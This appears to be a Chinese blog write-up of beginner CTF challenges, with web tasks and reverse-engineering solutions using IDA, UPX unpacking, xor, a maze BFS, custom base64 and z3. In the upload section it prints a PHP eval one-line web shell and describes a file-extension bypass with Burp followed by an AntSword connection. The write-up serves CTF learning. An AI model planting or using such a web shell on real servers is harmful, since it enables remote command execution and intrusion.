+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723792218249-f2dc7631-e715-4806-8082-109fe46a23e2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723792234932-c1f630e2-3618-4624-9e59-82e523a49066.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h2><p>查看源代码即可</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723790165788-815a3da9-3429-4422-ae06-75a0ed54b803.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="喵喵喵´•ﻌ•"><a href="#喵喵喵´•ﻌ•" class="headerlink" title="喵喵喵´•ﻌ•&#96;"></a>喵喵喵´•ﻌ•&#96;</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723790297615-5a4bd355-f9f5-4260-9732-63e764528d57.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723795805377-0ffdfa60-121f-4f40-a9ab-00f371c7a769.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723795822023-44bc8437-817b-4b61-a9b6-c0faf520e1a7.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="md5绕过欸"><a href="#md5绕过欸" class="headerlink" title="md5绕过欸"></a>md5绕过欸</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723793117335-90f7fdf9-d544-40a0-9f16-6df23d6f99ef.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723793465236-77f3632f-e936-41b1-876d-a19eefd19df9.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723793619918-61fa78e3-90d2-4264-b5ec-08fd3264848f.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a><font style="color:#DF2A3F;background-color:#FBDE28;"><?php @eval($_POST['cmd']); ?></font></h3><p><font style="color:#000000;"><?php?>是php的固定规范写法</font></p>
+<p><font style="color:#000000;">@表示后面如果执行错误不会报错</font></p>
+<p><font style="color:#000000;">eval()函数表示</font><font style="color:#000000;background-color:#FBDE28;">括号里的语句字符串为执行代码</font></p>
+<p><font style="color:#000000;">&amp;_POST[‘cmd’]表示从页面中以post方式接受变量cmd</font></p>
+<p><font style="color:#000000;">cmd是蚁剑的连接密码</font></p>
+<p><font style="color:#000000;"></font></p>
+<h3 id="先写一句木马，传入木马文件"><a href="#先写一句木马，传入木马文件" class="headerlink" title="先写一句木马，传入木马文件"></a>先写一句木马，<font style="color:#000000;">传入木马文件</font></h3><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723793726319-06f98ac9-7278-49b7-a3e1-a1951becb0a9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723793808260-a92db341-64ba-4d90-aa56-bfcbb256be6a.png" srcset="/img/loading.gif" lazyload></p>
+<p>要上传照片，所以改成jpg</p>
+<p>然后用burp抓包截取，将改成php（像这样）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721808648617-db61a13a-5fd8-484a-b5e9-932d510f0534.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" srcset="/img/loading.gif" lazyload></p>
+<p>传入后连接蚁剑</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724042980823-00939c02-4eff-42fd-9929-36f5395bc6ba.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:#DF2A3F;">这里的意思是将传入的文件保存到uploads目录下面</font></p>
+<p><font style="color:#DF2A3F;">注意他这里要访问到传入php的文件地址</font></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724042938596-0786a2be-f5b2-402d-8ed3-619a9ab39bf0.png" srcset="/img/loading.gif" lazyload></p>
+<p>测试连接成功后就可以查找flag了，就在根目录下面</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724043316235-079eff0b-6067-4002-807c-b972a96ba727.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="You-are-good-at-IDA"><a href="#You-are-good-at-IDA" class="headerlink" title="You are good at IDA"></a>You are good at IDA</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723716996028-c4898f89-83ff-481a-82a7-639589ffe6f1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723717176777-bf9d51a5-9df8-4a30-bbe0-fef369fcf2ce.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723717153510-76fe3d15-9917-44f4-abf9-1b7ce0f936d9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723717372424-b7212e6a-9178-4e1d-b7ef-e64a670f5a0b.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723717391740-0464189d-8cfb-4486-b997-fc10fee6b7b9.png" srcset="/img/loading.gif" lazyload></p>
+<p>BaseCTF{Y0u_4Re_900d_47_id4}</p>
+<h2 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723720497439-dd92058e-0e93-4f2b-997d-d990d70408c0.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723720599630-543dca3c-704d-449c-b73c-d6d2fd0d4556.png" srcset="/img/loading.gif" lazyload></p>
+<p>base解码即可</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723720632310-0566c1e8-e404-4186-91e2-cd89b1711451.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ez-xor"><a href="#ez-xor" class="headerlink" title="ez_xor"></a>ez_xor</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724038834954-71c5afd9-7e76-4de9-aaa9-82649b584458.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724039139378-bab032d3-fecc-4d0a-b6d3-a6efbd5514c0.png" srcset="/img/loading.gif" lazyload></p>
+<p>看汇编提取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[0x1,0x9,0x5,0x25,0x26,0x2d,0x0b,0x1d,0x24,0x7a,0x31,0x20,0x1e,0x49,0x3d,0x67,0x4d,0x50,0x8,0x25,0x2e,0x6e,0x5,0x34,0x22,0x40,0x3b,0x25]<br>print(len(a))<br>b=[]<br>v5=[0x58,0x6f,0x72]<br># 第一个循环：生成 b 列表的字符并打印<br>for i in range(28):<br>    b.append(i ^ (v5[i % 3]))<br>    print(chr(b[i] % 256), end=&#x27;&#x27;)<br>print(&quot;\n&quot;)<br># 第二个循环：将 a[i] 和 c[28-i-1] 异或，转换为字符并打印<br>for i in range(28):<br>    a[i] ^= b[28 - i - 1]<br>    print(chr(a[i]), end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724039385190-c7ba5903-0963-413c-ab43-ddfeb3732a6e.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723720756607-c5e3f750-28f2-4bf6-9231-b4d11ff18709.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723721129646-be7dfa2c-b212-421b-bda3-d8cdb3bffa5b.png" srcset="/img/loading.gif" lazyload></p>
+<p>小写的md5</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723720955778-8eb1ac27-68ef-416c-b585-8d69be929de4.png" srcset="/img/loading.gif" lazyload></p>
+<p>到y就是胜利，$,ord为36是invalidmovehit，不能移动</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723721240184-ec5eb2fe-eaaa-4e59-9247-f8636ba23759.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:#DF2A3F;">15x15的迷宫</font></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723721440417-9f2cd484-e12c-4011-9a01-396a79c504d1.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs plain">from collections import deque<br># str为ida中使用快捷键[shift+e]提取到的数据, 如果提取的是string literal则加上引号视作字符串，如果是C array(decimal)则加上中括号视作列表<br>str = [<br><br>    120, 36, 36, 36, 36, 36, 36, 36, 36, 36,<br>    36, 36, 36, 36, 36, 38, 38, 38, 38, 38,<br>    38, 36, 36, 36, 36, 36, 36, 36, 36, 36,<br>    38, 36, 38, 36, 36, 38, 36, 36, 38, 38,<br>    38, 38, 38, 36, 36, 38, 36, 38, 36, 36,<br>    36, 38, 38, 36, 36, 36, 36, 38, 36, 36,<br>    38, 36, 36, 36, 38, 38, 38, 36, 36, 36,<br>    36, 36, 38, 36, 36, 38, 36, 36, 36, 38,<br>    36, 38, 38, 36, 38, 36, 36, 36, 36, 36,<br>    38, 36, 36, 36, 38, 36, 38, 36, 36, 38,<br>    38, 38, 36, 36, 36, 38, 38, 38, 38, 38,<br>    36, 38, 38, 38, 38, 36, 38, 36, 36, 36,<br>    36, 36, 36, 36, 36, 36, 38, 38, 38, 38,<br>    38, 38, 36, 36, 36, 36, 36, 36, 36, 36,<br>    36, 38, 36, 36, 36, 36, 36, 36, 36, 36,<br>    36, 36, 36, 38, 38, 38, 38, 36, 36, 38,<br>    38, 38, 36, 36, 36, 36, 36, 36, 38, 38,<br>    38, 38, 38, 38, 38, 36, 36, 36, 36, 36,<br>    36, 36, 36, 36, 36, 36, 36, 36, 36, 38,<br>    36, 36, 38, 36, 36, 36, 36, 36, 36, 36,<br>    36, 36, 36, 36, 38, 36, 38, 36, 36, 36,<br>    36, 36, 36, 36, 36, 36, 38, 38, 38, 38,<br>    38, 38, 38, 38, 121<br>]<br>s = 0  # s用作索引访问str, 供下面tmp列表取值<br><br># 分析题目后设置迷宫的行列<br>row = 15 # 设置二维迷宫行数<br>col = 15 # 设置二维迷宫列数<br><br>maze = []<br>for i in range(row):<br>    tmp = []<br>    for j in range(col):<br>        tmp.append(str[s])<br>        s += 1<br>    maze.append(tmp)  # 凑一行添加一行到迷宫中<br>print(maze)<br># 设置二维四向迷宫, 如果题目是多个小迷宫问题, 拆分多次调用脚本获取路径即可<br>path_len = 0x7fffffff  # 如果题目未给出终点坐标，则一定会指定路径的长度，在此处修改路径长度并+1，否则请保留path_len的极大值 0x7fffffff<br><br><br># 进行BFS寻找路径<br>def bfs(start, end, barrier):<br>    directions = [(0, 1), (1, 0), (0, -1), (-1, 0)]  # 定义四个方向的移动<br>    for i in range(len(maze)):  # 获取起点和终点在列表中的索引<br>        for j in range(len(maze[i])):<br>            if (maze[i][j] == start):<br>                start = (i, j)<br>            if (maze[i][j] == end):<br>                end = (i, j)<br>    # 以下均是bfs算法套路<br>    queue = deque()<br>    queue.append((start, [start]))  # (当前位置, 路径)<br>    visited = set()<br>    visited.add(start)<br>    while queue:<br>        position, path = queue.popleft()<br>        if position == end:<br>            return path<br>        elif len(path) == path_len:<br>            return path<br>        for d in directions:<br>            next_position = (position[0] + d[0], position[1] + d[1])<br>            if 0 &lt;= next_position[0] &lt; len(maze) and 0 &lt;= next_position[1] &lt; len(maze[0]) and \<br>                    maze[next_position[0]][next_position[1]] != barrier and next_position not in visited:<br>                queue.append((next_position, path + [next_position]))<br>                visited.add(next_position)<br>    return None<br><br><br># 执行BFS搜索并打印结果<br>if __name__ == &#x27;__main__&#x27;:<br>    # maze[起点x坐标][起点y坐标] = &#x27;S&#x27; #如果题目给了起点终点的坐标，在这里直接给起点和终点添加特征<br>    # maze[终点x坐标][终点y坐标] = &#x27;E&#x27;<br><br>    path = bfs(120, 121, 36)  # bfs函数传入参数代表起点、终点、障碍的特征(若题目给出的数据无特征, 手动添加特征即可, 通常障碍是1也有可能是0或其它字符如&#x27;#&#x27;)<br>    print(&quot;移动路径坐标：&quot;, path)<br>    print(&quot;移动路径方位：&quot;, end=&#x27;&#x27;)<br>    for i in range(1, len(path)):<br>        x1, y1, x2, y2 = path[i - 1][0], path[i - 1][1], path[i][0], path[i][1]<br>        if (x1 &gt; x2):  # 上<br>            print(&quot;w&quot;, end=&#x27;&#x27;)<br>        elif (x1 &lt; x2):  # 下<br>            print(&quot;s&quot;, end=&#x27;&#x27;)<br>        elif (y1 &gt; y2):  # 左<br>            print(&quot;a&quot;, end=&#x27;&#x27;)<br>        elif (y1 &lt; y2):  # 右<br>            print(&quot;d&quot;, end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723725020955-fb895653-e442-4383-b500-fd27029cb6d1.png" srcset="/img/loading.gif" lazyload></p>
+<p>BaseCTF{131b7d6e60e8a34cb01801ae8de07efe}</p>
+<h2 id="Baseplus"><a href="#Baseplus" class="headerlink" title="Baseplus"></a>Baseplus</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723792333054-25615cc1-9fb2-4804-a0fd-d51148e4eeb4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723792371314-8a8d272b-ad4c-4e7e-b87f-18c0989873c6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724039671519-b818d7e1-7edf-4272-b703-9687559fba96.png" srcset="/img/loading.gif" lazyload></p>
+<p>先进行base64然后xor</p>
+<p>所以反过来解码就行</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724039788793-5ae8b15e-3993-4658-86d3-2fef8743f494.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724927341548-f8ff8e93-dddd-47e0-b72a-ca5f00289136.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724927606635-38ab506f-bb39-4901-bedf-f7a07da08e17.png" srcset="/img/loading.gif" lazyload></p>
+<p>可能改了一些东西</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724927989037-69da9568-4f34-421c-9a3b-5637bdfaf346.png" srcset="/img/loading.gif" lazyload></p>
+<p>将小写改成大写就可以脱壳了</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724928130673-24441937-b80d-4c8b-93ac-685897db8502.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1724928152970-51119154-c262-4d49-a4e5-69d3dc49dc81.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724929366218-495fa013-d99c-439f-a11c-3bd0b1bf829a.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64<br><br><br>def custom_base64_decode(encoded_string, custom_chars):<br>    # 创建一个映射表，将自定义字符映射到标准 Base64 字符<br>    standard_chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;<br>    translation_table = str.maketrans(custom_chars, standard_chars)<br><br>    # 转换自定义 Base64 字符串为标准 Base64 字符串<br>    standard_encoded_string = encoded_string.translate(translation_table)<br><br>    # 进行 Base64 解码<br>    decoded_bytes = base64.b64decode(standard_encoded_string)<br><br>    # 将解码后的字节转换为字符串<br>    return decoded_bytes.decode(&#x27;utf-8&#x27;)<br><br><br># 示例使用<br>encoded_string = &quot;$rg7_dhd~Alidg+zeyhz`vnz_d,7sy0=&quot;<br>custom_chars = &#x27;A,.1fgvw#`/2ehux$~&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noX&#x27;  # 示例自定义字符集<br><br># 解码<br>decoded_string = custom_base64_decode(encoded_string, custom_chars)<br><br># 输出结果<br>print(&quot;解码结果:&quot;, decoded_string)<br>#BaseCTF&#123;UPX_1s_$o_e@sy&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="lk"><a href="#lk" class="headerlink" title="lk"></a>lk</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724931762695-32bc1293-4335-4936-be60-0c5937f0fb7b.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724932198797-893f2796-4b86-4ffa-a41d-2e64c3054c6a.png" srcset="/img/loading.gif" lazyload></p>
+<p>改为2**9</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br></pre></td><td class="code"><pre><code class="hljs plain">from z3 import *<br>s = Solver()<br>v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18,v19,v20 = Ints(&quot;v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18 v19 v20&quot;)<br>s.add(948 * v20+ 887 * v19+ 410 * v18+ 978 * v17+ 417 * v16+ 908 * v15 + 965 * v14+ 987 * v13<br>+ 141 * v12+ 257 * v11+ 323 * v10+ 931 * v9+ 773 * v8 + 851 * v7+ 758 * v6+ 891 *v5+ 575 * v4<br>+ 616 * v3+ 860 * v2+ 283 * v1 == 913686)<br>s.add(938 * v20+ 490 * v19+ 920 * v18+ 50 * v17+ 568 * v16+ 68 * v15+ 35 * v14+ 708 * v13+ 938 * v12<br>+ 718 * v11+ 589 * v10+ 954 * v9+ 974 * v8+ 62 * v7+ 580 * v6+ 80 * v5+ 111 * v4+ 151 * v3<br>+ 421 * v2+ 148 * v1 == 630335)<br>s.add(908 * v20+ 590 * v19+ 668 * v18+ 222 